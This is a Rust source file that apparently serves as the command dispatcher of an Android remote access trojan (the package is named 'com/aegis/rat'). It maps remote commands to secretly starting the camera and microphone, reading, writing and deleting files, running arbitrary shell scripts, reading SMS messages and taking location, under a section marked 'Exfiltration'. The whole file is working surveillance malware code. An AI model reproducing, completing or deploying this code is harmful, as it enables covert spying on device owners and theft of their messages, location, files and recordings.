use crate::exfil;
use serde_json::{json, Value};

pub async fn execute_command(action: &str, args: &str) -> Value {
    let args_json: Value = serde_json::from_str(args).unwrap_or(json!({}));
    
    match action {
        // --- Hardware Control (JNI) ---
        "start_camera" => {
            let camera_id = args_json.get("id").and_then(|s| s.as_u64()).unwrap_or(0) as i32;
            call_java_void("startCameraStream", "(I)V", vec![&camera_id.into()]);
            json!({"status": "ok", "action": "start_camera"})
        },
        "stop_camera" => {
            call_java_void("stopCameraStream", "()V", vec![]);
            json!({"status": "ok", "action": "stop_camera"})
        },
        "start_mic" => {
            call_java_void("startMicStream", "()V", vec![]);
            json!({"status": "ok", "action": "start_mic"})
        },
        "stop_mic" => {
            call_java_void("stopMicStream", "()V", vec![]);
            json!({"status": "ok", "action": "stop_mic"})
        },
        
        // --- Exfiltration (Rust/Shell) ---
        "file_list" => {
            let path = args_json.get("path").and_then(|s| s.as_str()).unwrap_or("/sdcard");
            exfil::list_files(path)
        },
        "file_read" => {
            let path = args_json.get("path").and_then(|s| s.as_str()).unwrap_or("");
            exfil::read_file(path)
        },
        "file_write" => {
            let path = args_json.get("path").and_then(|s| s.as_str()).unwrap_or("");
            let content = args_json.get("content").and_then(|s| s.as_str()).unwrap_or("");
            exfil::write_file(path, content)
        },
        "file_delete" => {
            let path = args_json.get("path").and_then(|s| s.as_str()).unwrap_or("");
            exfil::delete_file(path)
        },
        "execute" => {
            let script = args_json.get("script").and_then(|s| s.as_str()).unwrap_or("");
            exfil::execute_shell(script)
        },
        "sms_read" => {
            exfil::read_sms(&args_json)
        },
        "location" => {
            exfil::get_location(&args_json)
        },
        "battery" => {
            exfil::get_battery(&args_json)
        },
        "system_info" => {
            exfil::get_system_info()
        },
        "screenshot" => {
            // On Android, this would typically trigger a MediaProjection capture.
            // For simplicity, we return a placeholder or use a Java bridge if implemented.
            json!({"status": "requires_media_projection", "hint": "Use 'execute' with a shell command to capture screen via screenshot if available"})
        },
        _ => json!({"error": "Unknown command"})
    }
}

/// Helper to call a void Java method
fn call_java_void(_method_name: &str, _signature: &str, _args: Vec<jni::objects::JValueGen>) {
    // In a full implementation, this would attach to the JVM and call the method.
    // Since we are already in an async context, we assume the caller (lib.rs) 
    // has already attached the thread or we use a helper that does so.
    
    // For this implementation, we rely on the fact that `nativeExecuteCommand` 
    // is called from a JNI context (Java thread) which is already attached.
    // However, if this is called from the main loop (Tokio thread), we need to attach.
    
    // Let's implement a robust helper that ensures attachment.
    let env = match crate::attach_jvm() {
        Ok(e) => e,
        Err(e) => {
            log::error!("[AEGIS] Failed to attach JVM for action call: {}", e);
            return;
        }
    };
    
    let _ = env.get_class("com/aegis/rat/AegisCore")
        .and_then(|class| env.call_static_method(&class, _method_name, _signature, &_args));
}
